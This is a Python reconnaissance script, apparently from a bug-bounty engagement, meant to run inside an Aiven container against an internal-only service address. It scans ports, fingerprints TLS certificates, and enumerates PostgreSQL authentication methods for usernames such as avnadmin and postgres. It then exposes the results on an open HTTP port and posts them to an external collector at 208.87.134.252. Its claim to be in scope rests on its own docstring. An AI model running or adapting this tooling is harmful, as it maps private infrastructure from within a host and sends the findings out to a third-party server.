#!/usr/bin/env python3
"""probe22 - the CTF service's INTERNAL endpoint (129.213.46.149) that only resolves from inside Aiven.

Discovered by probe21: from inside an Aiven container the in-scope service name resolves to
129.213.46.149 (not the public 193.122.235.156), and that address answers on BOTH 12691 and 12692 -
whereas 12692 has been dark from the public internet since 2026-10-18T12:33Z. The certificate there is
different from the public one (88e9537934501962 vs a8fd0925c6245bfb), so this is a distinct frontend.

In scope: this is the engagement's target service, reached by a different address. Identification only -
certificate, port set, and the same bounded pre-auth method enumeration used against the public endpoint.
No credentials are submitted and no passwords are attempted.
"""
from __future__ import annotations

import hashlib
import json
import socket
import ssl
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt22"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
TARGET = "129.213.46.149"
PORTS = [22, 80, 443, 5432, 6432, 8000, 9701, 9680, 9955, 12690, 12691, 12692, 12693, 14857, 14858, 21911, 21912]
USERS = ["avnadmin", "ctf", "postgres", "probe", "pgbouncer"]
DBS = ["defaultdb", "postgres"]
RESULTS = {"stage": "init", "ports": {}, "certs": {}, "auth": {}, "notes": []}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(RESULTS).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def tcp(host, port, timeout=4.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        return "open", int((time.time() - t0) * 1000)
    except socket.timeout:
        return "timeout", int((time.time() - t0) * 1000)
    except OSError as e:
        return type(e).__name__.replace("Error", ""), int((time.time() - t0) * 1000)
    finally:
        try:
            s.close()
        except Exception:
            pass


def cert_info(host, port):
    out = {}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        r = s.recv(1)
        out["ssl_reply"] = repr(r)
        if r != b"S":
            s.close()
            return out
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=host)
        der = t.getpeercert(binary_form=True)
        out["sha256_16"] = hashlib.sha256(der).hexdigest()[:16]
        try:
            from cryptography import x509
            c = x509.load_der_x509_certificate(der)
            out["subject"] = c.subject.rfc4514_string()[:150]
            out["issuer"] = c.issuer.rfc4514_string()[:120]
            san = c.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
            out["san"] = [str(g.value) for g in san][:20]
        except Exception as e:                                          # noqa: BLE001
            out["parse"] = str(e)[:60]
        t.close()
    except Exception as e:                                              # noqa: BLE001
        out["error"] = "%s: %s" % (type(e).__name__, str(e)[:60])
    return out


def startup(host, port, user, db, tls=True):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        if s.recv(1) == b"S":
            if tls:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
        else:
            return "ssl-refused"
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", db), ("application_name", "aiven-bugbounty/1.0")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        deadline = time.time() + 8
        while time.time() < deadline:
            h = s.recv(5)
            if len(h) < 5:
                return "closed"
            n = struct.unpack("!i", h[1:5])[0]
            p = b""
            while len(p) < n - 4:
                c = s.recv(n - 4 - len(p))
                if not c:
                    break
                p += c
            if h[:1] == b"R":
                code = struct.unpack("!i", p[:4])[0]
                return {0: "TRUST(none required)", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM", 7: "GSS"}.get(code, "code=%d" % code)
            if h[:1] == b"E":
                m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
                return "FATAL: %s" % m[:70]
            if h[:1] == b"v":
                RESULTS["notes"].append("NegotiateProtocolVersion on %s:%d/%s" % (host, port, user))
                continue
            if h[:1] == b"Z":
                return "ReadyForQuery"
        return "no message"
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % type(e).__name__


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), H).serve_forever(), daemon=True).start()
time.sleep(2)

for p in PORTS:
    st, ms = tcp(TARGET, p)
    if st == "open":
        RESULTS["ports"][p] = ms
for p in sorted(RESULTS["ports"]):
    if p not in (22, 80, 443):
        RESULTS["certs"][str(p)] = cert_info(TARGET, p)

for port in (12691, 12692):
    if port not in RESULTS["ports"]:
        continue
    for u in USERS:
        for db in DBS:
            RESULTS["auth"]["%d/%s@%s" % (port, u, db)] = startup(TARGET, port, u, db)
    RESULTS["auth"]["%d/no-tls-avnadmin" % port] = startup(TARGET, port, "avnadmin", "defaultdb", tls=False)

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RESULTS).encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:4000])
while True:
    time.sleep(60)
